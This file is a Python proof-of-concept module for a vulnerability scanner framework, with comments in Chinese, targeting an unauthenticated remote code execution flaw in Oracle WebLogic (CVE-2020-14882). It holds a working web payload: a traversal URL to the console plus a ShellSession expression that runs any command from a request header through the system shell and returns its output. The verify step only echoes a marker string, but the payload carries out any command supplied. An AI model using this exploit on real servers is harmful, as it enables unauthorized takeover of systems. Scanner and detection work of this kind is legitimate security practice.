from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import http.client
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

POC_NAME = "CVE202014882"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE202014882(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0011',    # PoC的VID编号
            'vbid': '',
            'Name': 'Weblogic RCE',    # PoC名称
            'Author': 'mumu',    # PoC作者
            'Create_date': '2021-06-25',    # PoC创建时间
            },

        'vul': {
            'Product': 'Weblogic',    # 漏洞所在产品名称
            'Version': '''
                Oracle Weblogic Server 10.3.6.0.0
                Oracle Weblogic Server 12.1.3.0.0
                Oracle Weblogic Server 12.2.1.3.0
                Oracle Weblogic Server 12.2.1.4.0
                Oracle Weblogic Server 14.1.1.0.0
            ''',    # 产品的版本号
            'Type': 'RCE',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                WebLogic未授权远程代码执行
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-25',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,'/console/css/%252e%252e%252fconsole.portal')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "cmd": "echo weblogictest"
        }

        data = '''
        _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");
        '''
        
        location = ""
        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'post', data = data, headers=headers, allow_redirects=False)
        if resp is not None:
            location = resp.text

        if "weblogictest" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            if verbose:
                highlight('[+] Weblogic RCE found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] Weblogic RCE not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)